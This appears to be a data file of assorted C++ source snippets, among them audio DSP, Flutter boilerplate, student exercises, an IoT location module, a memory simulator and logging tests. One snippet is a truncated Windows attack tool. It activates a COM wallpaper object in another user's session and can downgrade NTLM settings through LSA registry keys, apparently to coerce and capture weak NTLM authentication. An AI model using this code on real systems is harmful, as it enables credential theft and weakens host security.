deactivate()\\n\");\n}\n\nvoid BarrVerb::run(const float **inputs, float **outputs, uint32_t frames) {\n    // actual effects here\n\n    float x;\n    uint16_t opcode;\n\n    for (uint32_t i = 0; i < frames; i++) {\n        // smash to mono\n        lowpass[i] = (inputs[0][i] + inputs[1][i]) / 2;\n\n        // 10kHz lowpass filter, 2x oversampling\n        x = lowpass[i] - in_z1 - in_z2;\n        in_z2 += c2_1 * in_z1;\n        in_z1 += c1_1 * x;\n\n        x = (d0_1 * x + in_z2) - in_z12 - in_z22;\n        in_z22 += c2_2 * in_z12;\n        in_z12 += c1_2 * x;\n        lowpass[i] = d0_2 * x + in_z22;\n    }\n\n    // now run the DSP\n    for (uint32_t i=0; i < frames; i+=2) {\n        // run the actual DSP engine for each sample\n        for (uint8_t step = 0; step < 128; step++) {\n            opcode = rom[prog_offset + step];\n            switch (opcode & 0xc000) {\n                case 0x0000:\n                    ai = ram[ptr];\n                    li = acc + (ai >> 1);\n                    break;\n                case 0x4000:\n                    ai = ram[ptr];\n                    li = (ai >> 1);\n                    break;\n                case 0x8000:\n                    ai = acc;\n                    ram[ptr] = ai;\n                    li = acc + (ai >> 1);\n                    break;\n                case 0xc000:\n                    ai = acc;\n                    ram[ptr] = -ai;\n                    li = -(ai >> 1);\n                    break;\n            }\n            if (step == 0x00) {\n                // load RAM from ADC\n                ram[ptr] = (int)(lowpass[i] * 4096);\n            } else if (step == 0x60) {\n                // output right channel\n                outputs[1][i] = (float)ai / 4096;\n                outputs[1][i+1] = (float)ai / 4096;\n\n            } else if (step == 0x70) {\n                // output left channel\n                outputs[0][i] = (float)ai / 4096;\n                outputs[0][i+1] = (float",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hive_app_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <algorithm>\n#include \"csc300222fall/assignment1/lib.h\"\n\nusing namespace std;\n\nstd::string toUpperCase(std::string str) {\n\ttransform(str.begin(), str.end(), str.begin(), ::toupper);\n\treturn str;\n}\n\nstd::string toLowerCase(std::string str) {\n\ttransform(str.begin(), str.end(), str.begin(), ::tolower);\n\treturn str;\n}\n\nstd::string promptUserForFile(std::ifstream & stream, std::string prompt) {\n   if (prompt == \"\") prompt = \"Input file: \";\n   while (true) {\n\t  auto filename = getLine(prompt);\n      stream.open(filename.c_str(), ios::in);\n      if (!stream.fail()) return filename;\n      stream.clear();\n      cout << \"Unable to open that file.  Try again.\" << endl;\n   }\n\n}\n\nstd::string promptUserForFile(std::ofstream & stream, std::string prompt) {\n   if (prompt == \"\") prompt = \"Input file: \";\n   while (true) {\n\t  auto filename = getLine(prompt);\n      stream.open(filename.c_str(), ios::out);\n      if (!stream.fail()) return filename;\n      stream.clear();\n      cout << \"Unable to open that file.  Try again.\" << endl;\n   }\n}\n\nstd::string getLine(std::string prompt) {\n\tcout << prompt;\n\tstring str;\n\tgetline(cin, str);\n\treturn str;\n}",
    "#include \"location.h\"\n#include \"module/network/network.h\"\n#include \"module/private.h\"\n#include <MD5Builder.h>\n#include <HTTPClient.h>\n#include <ArduinoJson.h>\n#include <module/console/console.h>\n\nLocation::Location()\n    : _state(idle) {\n    server = \"https://apis.map.qq.com\";\n}\n\nvoid Location::update(Core::S64 deltaMs) {\n    switch (_state) {\n        case idle: {\n            setState(locating);\n            break;\n        }\n        case locating: {\n            auto& network = Network::instance();\n            network.wakeup();\n            if (network.online()) {\n                if (locate()) {\n                    setState(located);\n                    _relocateTimeout = 60_m;\n                }\n            }\n            break;\n        }\n        case located: {\n            _relocateTimeout -= deltaMs;\n            if (_relocateTimeout <= 0) {\n                setState(idle);\n            }\n            break;\n        }\n    }\n}\n\nLocation::State Location::state() const {\n    return _state;\n}\n\nconst Location::Detail& Location::detail() const {\n    return _detail;\n}\n\nvoid Location::setState(Location::State newState) {\n    if (_state != newState) {\n        _state = newState;\n\n        Event_LocationStateChanged event;\n        event.state = _state;\n        Event::instance().On(event);\n    }\n}\n\nbool Location::locate() {\n    String path = \"/ws/location/v1/ip\";\n    String params = path + \"?key=\" + LOCATE_KEY;\n    MD5Builder md5;\n    md5.begin();\n    md5.add(params + LOCATE_SK);\n    md5.calculate();\n    String sig = md5.toString();\n\n    String url = server + params + \"&sig=\" + sig;\n\n    bool succeed = false;\n\n    HTTPClient http;\n    http.begin(url);\n    http.setTimeout(5000);\n    auto code = http.GET();\n    if (code == HTTP_CODE_OK) {\n        JsonDocument doc;\n        deserializeJson(doc, http.getString());\n        if (doc[\"status\"] == 0) {\n            auto result = doc[\"result\"];\n            _detail.ip = result[\"ip\"].as<String>();\n            _detail.latitude = result[\"location\"][\"lat\"];\n            _detail.longitude = result[\"location\"][\"lng\"];\n            succeed = true;\n        }\n    }\n\n    return succeed;\n}\n",
    "#include <windows.h>\n#include <shlobj.h>\n#include <exdisp.h>\n#include <mshtml.h>\n#include <iostream>\n#include <atlbase.h>\n#include <strsafe.h>\n#include <stdio.h>\n#include <winreg.h>\n#include <stdint.h>\n\nHRESULT CoCreateInstanceInSession(DWORD session, REFCLSID rclsid, REFIID riid, void** ppv) {\n    BIND_OPTS3 bo = {};\n    WCHAR wszCLSID[50];\n    WCHAR wszMonikerName[300];\n    StringFromGUID2(rclsid, wszCLSID, _countof(wszCLSID));\n    StringCchPrintf(wszMonikerName, _countof(wszMonikerName),\n        L\"session:%d!new:%s\", session, wszCLSID);\n    bo.cbStruct = sizeof(bo);\n    bo.dwClassContext = CLSCTX_LOCAL_SERVER;\n    return CoGetObject(wszMonikerName, &bo, riid, ppv);\n}\n\nvoid GetRegKey(const wchar_t* path, const wchar_t* key, DWORD* oldValue) {\n    HKEY hKey;\n    DWORD value;\n    DWORD valueSize = sizeof(DWORD);\n\n\n    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {\n        RegQueryValueExW(hKey, key, NULL, NULL, (LPBYTE)&value, &valueSize);\n        RegCloseKey(hKey);\n        *oldValue = value;\n    }\n    else {\n        printf(\"Error reading registry key.\\n\");\n    }\n}\n\nvoid SetRegKey(const wchar_t* path, const wchar_t* key, DWORD newValue) {\n    HKEY hKey;\n\n    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {\n        RegSetValueExW(hKey, key, 0, REG_DWORD, (const BYTE*)&newValue, sizeof(DWORD));\n        RegCloseKey(hKey);\n    }\n    else {\n        printf(\"Error writing registry key.\\n\");\n    }\n}\n\nvoid ExtendedNTLMDowngrade(DWORD* oldValue_LMCompatibilityLevel, DWORD* oldValue_NtlmMinClientSec, DWORD* oldValue_RestrictSendingNTLMTraffic) {\n    GetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\", L\"LMCompatibilityLevel\", oldValue_LMCompatibilityLevel);\n    SetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\", L\"LMCompatibilityLevel\", 2);\n\n    GetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\MSV1_0\", L\"NtlmMinClientSec\", oldValue_NtlmMinClientSec);\n    SetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\MSV1_0\", L\"NtlmMinClientSec\", 536870912);\n\n    GetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\MSV1_0\", L\"RestrictSendingNTLMTraffic\", oldValue_RestrictSendingNTLMTraffic);\n    SetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\MSV1_0\", L\"RestrictSendingNTLMTraffic\", 0);\n}\n\nvoid NTLMRestore(DWORD oldValue_LMCompatibilityLevel, DWORD oldValue_NtlmMinClientSec, DWORD oldValue_RestrictSendingNTLMTraffic) {\n    SetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\", L\"LMCompatibilityLevel\", oldValue_LMCompatibilityLevel);\n    SetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\MSV1_0\", L\"NtlmMinClientSec\", oldValue_NtlmMinClientSec);\n    SetRegKey(L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\MSV1_0\", L\"RestrictSendingNTLMTraffic\", oldValue_RestrictSendingNTLMTraffic);\n}\n\nint wmain(int argc, wchar_t* argv[]) {\n    if (argc < 3 || argc > 4) {\n        std::wcerr << L\"Usage: \" << argv[0] << L\" <session> <image_path> [-downgrade]\" << std::endl;\n        return 1;\n    }\n\n    bool downgrade = false;\n    if (argc == 4 && wcscmp(argv[3], L\"-downgrade\") == 0) {\n        downgrade = true;\n    }\n\n    DWORD oldValue_LMCompatibilityLevel = 0;\n    DWORD oldValue_NtlmMinClientSec = 0;\n    DWORD oldValue_RestrictSendingNTLMTraffic = 0;\n\n    if (downgrade) {\n        ExtendedNTLMDowngrade(&oldValue_LMCompatibilityLevel, &oldValue_NtlmMinClientSec, &oldValue_RestrictSendingNTLMTraffic);\n    }\n\n    DWORD session = _wtoi(argv[1]);\n    const wchar_t* imagePath = argv[2];\n\n    HRESULT hr = CoInitialize(NULL);\n    if (FAILED(hr)) {\n        std::wcerr << L\"CoInitialize failed with error: \" << hr << std::endl;\n        return 1;\n    }\n\n    CLSID clsidShellWindows;\n    hr = CLSIDFromString(OLESTR(\"{C2CF3110-460E-4FC1-B9D0-8A1C0C9CC4BD}\"), &clsidShellWindows);\n    if (FAILED(hr)) {\n        std::wcerr << L\"CLSIDFromString failed with error: \" << hr << std::endl;\n        CoUninitialize();\n        return 1;\n    }\n\n    IID iidIShellWindows;\n    hr = IIDFromString(OLESTR(\"{B92B56A9-8B55-4E14-9A89-0199BBB6F93B}\"), &iidIShellWindows);\n    if (FAILED(hr)) {\n        std::wcerr << L\"IIDFromString failed with error: \" << hr << std::endl;\n        CoUninitialize();\n        return 1;\n    }\n\n    IDesktopWallpaper* pDesktopWallpaper = nullptr;\n    hr = CoCreateInstanceInSession(session, clsidShellWindows, iidIShellWindows, (void**)&pDesktopWallpaper);\n    if (FAILED(hr)) {\n        std::wcerr << L\"CoCreateInstanceInSession failed with error: \" << hr << std::endl;\n        CoUninitialize();\n        return 1;\n    }\n\n    UINT monitorCount;\n    hr = pDesktopWallpaper->GetMonitorDevicePathCount(&monitorCount);\n    if (FAILED(hr)) {\n        std::wcerr << L\"GetMonitorDevicePathCount failed with error: \" << hr << std::endl;\n        pDesktopWallpaper->Release();\n        CoUninitialize();\n        return 1;\n    }\n\n    for (UINT i = 0; i < monitorCount; i++) {\n        LPWSTR monitorId;\n        hr = pDesktopWallpaper->GetMonitorDevicePathAt(i, &monitorId);\n\n        if (FAILED(hr)) {\n            std:",
    "#include <iostream>\r\n#include <cstdio>\r\n\r\nstruct Course {\r\n    double grade;\r\n    int credits;\r\n};\r\n\r\nvoid inputCourses(Course c[], int &numCourses) {\r\n    printf(\"Enter the number of courses for this semester: \");\r\n    std::cin >> numCourses;\r\n\r\n    for (int i = 0; i < numCourses; ++i) {\r\n        printf(\"Enter grade and credits for course %d: \", i + 1);\r\n        std::cin >> c[i].grade >> c[i].credits;\r\n    }\r\n}\r\n\r\ndouble calculateGPA(Course c[], int numCourses) {\r\n    double totalGradePoints = 0.0;\r\n    int totalCredits = 0;\r\n\r\n    for (int i = 0; i < numCourses; ++i) {\r\n        totalGradePoints += c[i].grade * c[i].credits;\r\n        totalCredits += c[i].credits;\r\n    }\r\n\r\n    return totalGradePoints / totalCredits;\r\n}\r\n\r\ndouble calculateCGPA(Course allCourses[], int totalCourses) {\r\n    double cumulativeGradePoints = 0.0;\r\n    int cumulativeCredits = 0;\r\n\r\n    for (int i = 0; i < totalCourses; ++i) {\r\n        cumulativeGradePoints += allCourses[i].grade * allCourses[i].credits;\r\n        cumulativeCredits += allCourses[i].credits;\r\n    }\r\n\r\n    return cumulativeGradePoints / cumulativeCredits;\r\n}\r\n\r\nint calculateTotalCredits(Course c[], int numCourses) {\r\n    int totalCredits = 0;\r\n\r\n    for (int i = 0; i < numCourses; ++i) {\r\n        totalCredits += c[i].credits;\r\n    }\r\n\r\n    return totalCredits;\r\n}\r\n\r\nint main() {\r\n    const int MAX_COURSES = 100;\r\n    Course allCourses[MAX_COURSES * 10];\r\n    int totalCourses = 0;\r\n    int numSemesters;\r\n\r\n    printf(\"Enter the number of semesters: \");\r\n    std::cin >> numSemesters;\r\n\r\n    for (int t = 0; t < numSemesters; ++t) {\r\n        Course c[MAX_COURSES];\r\n        int numCourses;\r\n\r\n        printf(\"\\nEntering data for semester %d\\n\", t + 1);\r\n        inputCourses(c, numCourses);\r\n\r\n        double gpa = calculateGPA(c, numCourses);\r\n        printf(\"Your GPA for semester %d is: %.2f\\n\", t + 1, gpa);\r\n\r\n        for (int i = 0; i < numCourses; ++i) {\r\n            allCourses[totalCourses++] = c[i];\r\n        }\r\n    }\r\n\r\n    double cgpa = calculateCGPA(allCourses, totalCourses);\r\n    printf(\"\\nYour cumulative CGPA is: %.2f\\n\", cgpa);\r\n\r\n    int totalCredits = calculateTotalCredits(allCourses, totalCourses);\r\n    printf(\"Your total credits are: %d\\n\", totalCredits);\r\n\r\n\r\n    return 0;\r\n}\r\n",
    "// #include <bits/stdc++.h> \r\n\r\n\r\n// int solveByRec(vector<int> &num, int x){\r\n//     if(x==0) return 0;\r\n//     if(x<0)  return INT_MAX;\r\n//     int mini=INT_MAX;\r\n\r\n//     for(int i=0;i<num.size();i++){\r\n//         int ans=solveByRec(num,x-num[i]);\r\n//         if(ans!=INT_MAX){\r\n//             mini=min(mini,1+ans);\r\n//         }\r\n//     }\r\n\r\n//     return mini;\r\n// }\r\n\r\n// int solveByMem(vector<int> &num, int x, vector<int> &dp) {\r\n//     if(x==0) return 0;\r\n//     if(x<0)  return INT_MAX;\r\n//     if(dp[x]!=-1) return dp[x];\r\n\r\n//     int mini=INT_MAX;\r\n//     for(int i=0;i<num.size();i++){\r\n//         int ans=solveByMem(num,x-num[i],dp);\r\n//         if(ans!=INT_MAX){\r\n//             mini=min(mini,1+ans);\r\n//         }\r\n//     }\r\n    \r\n//     dp[x]=mini;\r\n//     return mini;\r\n\r\n// }\r\n\r\n\r\n// int solveByTab(vector<int> &num, int x) {\r\n//     vector<int>dp(x+1,INT_MAX);\r\n//     dp[0]=0;\r\n\r\n//     for (int i = 1; i <= x; i++) {\r\n//         for (int j = 0; j < num.size(); j++) {\r\n//       if(i-num[j] >=0  && dp[i-num[j]] !=INT_MAX)      \r\n//         dp[i]=min(dp[i],1+dp[i-num[j]]);\r\n\r\n//         }\r\n//     }\r\n//    return dp[x];\r\n\r\n// }\r\n\r\n\r\n\r\n\r\n// int minimumElements(vector<int> &num, int x)\r\n// {\r\n\r\n//   /*by recursion only  \r\n//     // int ans=solveByRec(num,x);\r\n//     // if(ans==INT_MAX) return -1;\r\n//     // return ans;\r\n\r\n// */\r\n\r\n\r\n// /* by dp top down approach\r\n//    vector<int>dp(x+1,-1);\r\n//    int ans=solveByMem(num, x, dp);\r\n//    if(ans==INT_MAX) return -1;\r\n//    return ans;\r\n// */\r\n\r\n  \r\n \r\n// /* by dp tabulation approach\r\n//    int ans=solveByTab(num, x);\r\n//    if(ans==INT_MAX) return -1;\r\n//    return ans;\r\n// */\r\n\r\n\r\n// }\r\n\r\n\r\n",
    "#include<iostream>\nusing namespace std;\n\nclass Stack {\npublic:\n    int data;\n    Stack *next;\n    Stack(){\n        this->next = NULL;\n    }\n\n    void push(int a){\n        Stack *newStack = new Stack();\n        newStack->data = a;\n        newStack->next = NULL;\n        if (this->next == NULL){\n            this->next = newStack;\n        } else {\n            Stack *temp = next;\n            while (temp->next != NULL)\n            {\n                temp = temp->next;\n            }\n            temp->next = newStack;\n        } \n    }\n\n   void pop() {\n    if (this->next == NULL) {\n        cout << \"Stack Underflow\" << endl;\n        return;\n    }\n\n    Stack *temp = this;\n    if (temp->next->next == NULL) {\n        delete temp->next;\n        temp->next = NULL; \n        return;\n    }\n\n    while (temp->next->next != NULL) {\n        temp = temp->next;\n    }\n\n    delete temp->next;\n    temp->next = NULL;\n}\n\n};\nvoid printNodes(Stack *head) {\n    Stack *node = head->next;\n    while (node != NULL) {\n        cout << node->data << \"\\t\";\n        node = node->next;\n    }\n    cout << endl;\n}\n\nint main(int argc, char const *argv[]) {\n    Stack l1;\n    l1.push(1);\n    l1.push(2);\n    l1.push(3);\n    l1.push(4);\n    l1.pop();\n    l1.pop();\n    printNodes(&l1);\n    return 0;\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<cstdio>\n#include<math.h>\n#include <cstring>\nusing namespace std;\n\n\nvector<int> sub(vector<int>, vector<int>);\n\nostream& operator<<(ostream& out, const vector<int> a)\n{\n\tif (a.size() == 2 && a[1] == 0)return out << 0;\n\tif (a[a.size() - 1] == 0)out << \"-\";\n\n\tfor (int i = a.size() - 2; i >= 0; i--)out << a[i];\n\treturn out;\n\n}\n\nbool cmp(vector<int> a, vector<int> b)\n{\n\tif (a.size() != b.size())return a.size() > b.size();\n\tfor (int i = a.size() - 2; i >= 0; i--) {\n\t\tif (a[i] != b[i])return a[i] > b[i];\n\t}\n\treturn true;\n}\n\n\nvector<int> add(vector<int> a, vector<int> b)\n{\n\tif (a[a.size() - 1] ^ b[b.size() - 1]) {\n\t\tif (a[a.size() - 1] == 1)\n\t\t{\n\t\t\tb[b.size() - 1] = 1;\n\t\t\treturn sub(a, b);\n\t\t}\n\t\telse\n\t\t{\n\t\t\ta[a.size() - 1] = 1;\n\t\t\treturn sub(b, a);\n\t\t}\n\t}\n\tif (a.size() < b.size())return add(b, a);\n\tvector<int> c;\n\n\tint t = 0, n;\n\tfor (int i = 0; i < b.size()-1; i++)\n\t{\n\t\tn = t / 10;\n\t\tt = a[i] + b[i] + n;\n\t\tc.push_back(t % 10);\n\t}\n\tfor (int i = b.size()-1; i < a.size()-1; i++) {\n\t\tn = t / 10;\n\t\tt = a[i] + n;\n\t\tc.push_back(t % 10);\n\t}\n\tif (t >= 10)c.push_back(t / 10);\n\tc.push_back(a[a.size() - 1] * b[b.size() - 1]);\n\treturn c;\n}\n\n\nvector<int> sub(vector<int> a, vector<int> b)\n{\n\tif (a[a.size() - 1] ^ b[b.size() - 1]) {\n\t\tif (a[a.size() - 1] == 1)\n\t\t{\n\t\t\tb[b.size() - 1] = 1;\n\t\t\t\n\t\t\treturn add(a, b);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tb[b.size() - 1] = 0;\n\t\t\treturn add(b, a);\n\t\t}\n\t}\n\tint flag = 0;\n\tif (cmp(b, a))\n\t{\n\t\tflag = 1;\n\t\tvector<int>v;\n\t\tv = a;\n\t\ta = b;\n\t\tb = v;\n\t}\n\tint t = 0;\n\tvector<int> c;\n\tfor (int i = 0; i < a.size()-1; i++)\n\t{\n\t\tt = a[i] - t;\n\t\tif (i < b.size()-1)t -= b[i];\n\t\tc.push_back((t + 10) % 10);\n\t\tif (t < 0)t = 1;\n\t\telse t = 0;\n\t}\n\twhile (c.size() > 1 && c.back() == 0)c.pop_back();\n\tif (flag)c.push_back(0);\n\telse c.push_back(1);\n\n\treturn c;\n\n}\n\nvector<int> mul(vector<int> a, vector<int> b)\n{\n\tif (a.size() < b.size())return mul(b, a);\n\tvector<int>c, v;\n\tint t = 0;\n\tfor (int i = 0; i < b.size()-1; i++)\n\t{\n\t\tv.clear();\n\t\tfor (int j = 0; j < i; j++)v.push_back(0);\n\t\tt = 0;\n\t\tfor (int j = 0; j < a.size()-1; j++)\n\t\t{\n\t\t\tif (b[i] == 0) {\n\t\t\t\tv.push_back(b[i]);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tt = a[j] * b[i] + t / 10;\n\n\t\t\tv.push_back(t % 10);\n\t\t}\n\t\tif (t >= 10) {\n\t\t\tv.push_back(t / 10);\n\t\t}\n\t\tv.push_back(1);\n\t\tif (i == 0)c = v;\n\t\telse c = add(v, c);\n\t}\n\t\n\tif (a[a.size() - 1] ^ b[b.size() - 1])c[c.size() - 1] = 0; \n\treturn c;\n}\n\nvector<int> vert(string str)\n{\n\tvector<int> num;\n\tfor (int i = str.size() - 1; i > 0; i--)\n\t{\n\t\tnum.push_back(str[i] - '0');\n\t}\n\tif (str[0] == '-')num.push_back(0);\n\telse {\n\t\tnum.push_back(str[0] - '0');\n\t\tnum.push_back(1);\n\t}\n\treturn num;\n}\n\nvector<int> div(vector<int>a, int b)\n{\n\tvector<int>c;\n\tint r = 0;\n\tfor (int i = a.size() - 2; i >= 0; i--)\n\t{\n\t\tr = r * 10 + a[i];\n\t\tc.push_back(r / b);\n\t\tr %= b;\n\t}\n\treverse(c.begin(), c.end());\n\twhile (c.size() > 1 && c.back() == 0)c.pop_back();\n\tif (a[a.size() - 1] * b > 0) {\n\t\tif (b < 0)c.push_back(0);\n\t\telse c.push_back(1);\n\t}\n\telse\n\t{\n\t\tif (b > 0)c.push_back(0);\n\t\telse c.push_back(1);\n\t}\n\treturn c;\n}\n\nvector<int> div(vector<int> a, vector<int> b)\n{\n\tvector<int>m, n,r,one,c;\n\tone.push_back(1);\n\tone.push_back(1);\n\tc.push_back(0);\n\tc.push_back(1);\n\tm = a, n = b;\n\tm[m.size() - 1] = 1;\n\tn[n.size() - 1] = 1;\n\tr = sub(m, n);\n\tif (r[r.size() - 1] != 0)c = add(c,one);\n\twhile (cmp(r, n) && r[r.size() - 1] != 0) {\n\t\t/*if(c[0]==0&&c.size()==2)c = add(c, one);*/\n\t\tc = add(c, one);\n\t\tr = sub(r, n);\n\n\t}\n\tif (a[a.size() - 1] ^ b[b.size() - 1])c[c.size() - 1] = 0;\n\treturn c;\n}\n\nint main()\n{\n\tstring m, n;\n\tvector<int>a, b;\n\tvector<int> c;\n\tcin >> m >> n;\n\ta = vert(m);\n\tb = vert(n);\n\tc = add(a, b);\n\tcout << c;\n\n\t\n}",
    "// Copyright 2009-2022 NTESS. Under the terms\n// of Contract DE-NA0003525 with NTESS, the U.S.\n// Government retains certain rights in this software.\n//\n// Copyright (c) 2009-2022, NTESS\n// All rights reserved.\n//\n// Portions are copyright of other developers:\n// See the file CONTRIBUTORS.TXT in the top level directory\n// of the distribution for more information.\n//\n// This file is part of the SST software package. For license\n// information, see the LICENSE file in the top level directory of the\n// distribution.\n\n// Copyright 2016 IBM Corporation\n\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n\n//   http://www.apache.org/licenses/LICENSE-2.0\n\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//SST includes\n#include \"sst_config.h\"\n\n#include <memory>\n#include <assert.h>\n\n#include \"c_BankState.hpp\"\n#include \"c_BankInfo.hpp\"\n#include \"c_BankCommand.hpp\"\n#include \"c_BankStateActive.hpp\"\n#include \"c_BankStateActivating.hpp\"\n\nusing namespace SST;\nusing namespace SST::CramSim;\n\nc_BankStateActivating::c_BankStateActivating(std::map<std::string, unsigned>* x_bankParams) :\n\tm_receivedCommandPtr(nullptr) {\n\n        //Simulation::getSimulation()->getSimulationOutput().output(\"Entered %s\\n\", __PRETTY_FUNCTION__);\n\tm_timer = 0;\n\tm_currentState = e_BankState::ACTNG;\n\tm_bankParams = x_bankParams;\n\tm_allowedCommands.clear();\n}\n\nc_BankStateActivating::~c_BankStateActivating() {\n        //Simulation::getSimulation()->getSimulationOutput().output(\"\\n%s\\n\", __PRETTY_FUNCTION__);\n}\n\n// handle the command based state changes in function handleCommand( ... )\n// handle automatic state changes in function update( ... )\n\nvoid c_BankStateActivating::handleCommand(c_BankInfo* x_bank, c_BankCommand* x_bankCommandPtr, SimTime_t x_cycle) {\n        Output::getDefaultObject().output(\n                \"%s ERROR: should not receive a command in this state. This is a transitory state.\\n\", __PRETTY_FUNCTION__);\n}\n\nvoid c_BankStateActivating::clockTic(c_BankInfo* x_bank, SimTime_t x_cycle) {\n\n\tif (0 < m_timer) {\n\t\t--m_timer;\n\n\t} else {\n\t\tauto l_p = new c_BankStateActive(m_bankParams); // create pointer to the next state\n\t\tassert(e_BankCommandType::ACT == m_prevCommandPtr->getCommandMnemonic()); // only cmd allowed to flow through to BankStateActive is ACT\n\t\tl_p->enter(x_bank, this, m_prevCommandPtr, x_cycle);\n\t}\n}\n\nvoid c_BankStateActivating::enter(c_BankInfo* x_bank,\n\t\tc_BankState* x_prevState, c_BankCommand* x_cmdPtr, SimTime_t x_cycle) {\n        //Simulation::getSimulation()->getSimulationOutput().output(\"Entered %s\\n\", __PRETTY_FUNCTION__);\n\n\t// set timer for auto precharge countdown used in the pseudo-open page policy\n\tx_bank->setAutoPreTimer(m_bankParams->at(\"nRAS\"));\n\tx_bank->setRowOpen();\n\tx_bank->setOpenRowNum(x_cmdPtr->getHashedAddress()->getRow());\n\n\t// Being in the activating state does not make an ACT cmd response ready.\n\t// Therefore it is forwarded to BankStateActive\n\tm_prevCommandPtr = x_cmdPtr;\n\tm_receivedCommandPtr = nullptr;\n\tm_timer = 0; //TODO: Ask Michael Healey about the timing here\n\tm_allowedCommands.clear();\n\t// this state should not have any allowed bank commands\n\t// this is a transitory state\n\n\tx_bank->changeState(this);\n\tif (nullptr != x_prevState)\n\t\tdelete x_prevState;\n}\n\nstd::list<e_BankCommandType> c_BankStateActivating::getAllowedCommands() {\n\treturn (m_allowedCommands);\n}\n\n\nbool c_BankStateActivating::isCommandAllowed(c_BankCommand* x_cmdPtr,\n\t\tc_BankInfo* x_bankPtr) {\n\n\t// Cmd must be of an allowed type and BankState cannot already be processing another cmd\n\tfor (std::list<e_BankCommandType>::iterator l_iter =\n\t\t\tm_allowedCommands.begin(); l_iter != m_allowedCommands.end(); ++l_iter) {\n\n\t\tif (x_cmdPtr->getCommandMnemonic() == *l_iter && m_receivedCommandPtr\n\t\t\t\t== nullptr)\n\t\t\treturn true;\n\t}\n\treturn false;\n\n}\n",
    "\ufeff/*\n * Copyright (C) 2024 THL A29 Limited, a Tencent company.\n * BQLOG is licensed under the Apache License, Version 2.0.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n */\n#include \"test_log.h\"\n#include \"bq_common/platform/thread/thread.h\"\n\nnamespace bq {\n    namespace test {\n        static bq::string multi_thread_string_test_str = \"1234567890\";\n\n        class multi_thread_string_test_modifier : public bq::platform::thread {\n        protected:\n            virtual void run() override\n            {\n                while (!is_cancelled()) {\n                    multi_thread_string_test_str = \"1234567890\";\n                    multi_thread_string_test_str = \"#\";\n                }\n            }\n        };\n\n        void test_log::test_2(test_result& result, const test_category_log& log_inst)\n        {\n            result.add_result(log_inst.get_name() == \"test_log\", \"log name test\");\n\n            {\n                bq::string empty_str;\n                bq::string full_str = \"123\";\n                log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"Empty Str Test {}, {}\", empty_str, full_str);\n                result.add_result(log_str.end_with(\"[F]\\t[ModuleA.SystemA.ClassA]\\tEmpty Str Test , 123\"), \"log update 1\");\n            }\n\n            {\n                log_inst.fatal(log_inst.cat.ModuleA.SystemA, \"connect {}:{}\");\n                result.add_result(log_str.end_with(\"[F]\\t[ModuleA.SystemA.ClassA]\\tEmpty Str Test , 123\"), \"log update 2\");\n            }\n\n            {\n                bq::string empty_str;\n                bq::string full_str = \"123\";\n                log_inst.warning(log_inst.cat.ModuleA.SystemA.ClassA, \"Empty Str Test {}, {}\", empty_str.c_str(), full_str.c_str());\n                result.add_result(log_str.end_with(\"[F]\\t[ModuleA.SystemA.ClassA]\\tEmpty Str Test , 123\"), \"log update 3\");\n            }\n\n            {\n                bq::string ip = \"9.134.131.77\";\n                uint16_t port = 18900;\n                log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"connect {{}:{}}\", ip, port);\n                result.add_result(log_str.end_with(\"[F]\\t[ModuleA.SystemA.ClassA]\\tconnect {9.134.131.77:18900}\"), \"brace test 1\");\n                log_inst.fatal(log_inst.cat.ModuleA.SystemA.ClassA, \"connect {{}:{}}\");\n                